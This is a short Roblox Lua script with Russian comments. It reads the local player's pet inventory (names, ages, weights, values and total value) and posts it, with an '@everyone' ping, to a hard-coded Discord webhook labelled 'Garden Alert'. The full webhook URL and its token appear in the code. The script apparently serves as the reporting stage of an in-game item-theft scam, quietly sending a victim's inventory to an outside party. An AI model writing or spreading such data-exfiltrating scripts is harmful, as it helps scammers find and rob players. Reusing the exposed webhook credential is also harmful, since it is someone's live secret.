local Http = game:GetService("HttpService")
local Players = game:GetService("Players")

local WEBHOOK = "https://discord.com/api/webhooks/1400543185209528441/NhkUJfUuqiPiyl6gO7PbawGZl4Pmmu2DC_uX1UMQaOsUkXGvbRMBxA4LIoTRg9vGiFzm"

if not game:IsLoaded() then
    game.Loaded:Wait()
end

task.wait(5)

local function collectPets()
    local player = Players.LocalPlayer
    if not player or not player:FindFirstChild("leaderstats") then
        return
    end

    local leaderstats = player.leaderstats
    local pets = leaderstats:FindFirstChild("Pets") or leaderstats:WaitForChild("Animals", 3)
    
    if not pets then
        return
    end

    local totalValue = leaderstats:FindFirstChild("TotalValue") and leaderstats.TotalValue.Value or 0
    local report = "**@everyone**\n"
    report = report .. "**Total Value:** " .. totalValue .. "\n\n"

    for _, pet in ipairs(pets:GetChildren()) do
        if pet:IsA("Folder") and pet:FindFirstChild("Age") and pet:FindFirstChild("Weight") and pet:FindFirstChild("Value") then
            report = report .. string.format(
                "%s [Age: %d] [%.2f KG] - %d Value\n",
                pet.Name,
                pet.Age.Value,
                pet.Weight.Value,
                pet.Value.Value
            )
        end
    end

    -- Отправка в Discord
    local success, errorMessage = pcall(function()
        Http:PostAsync(WEBHOOK, Http:JSONEncode({
            content = report,
            username = "Garden Alert"
        }))
    end)
    
    if not success then
        warn("Ошибка отправки:", errorMessage)
    end
end

task.wait(1)
collectPets()
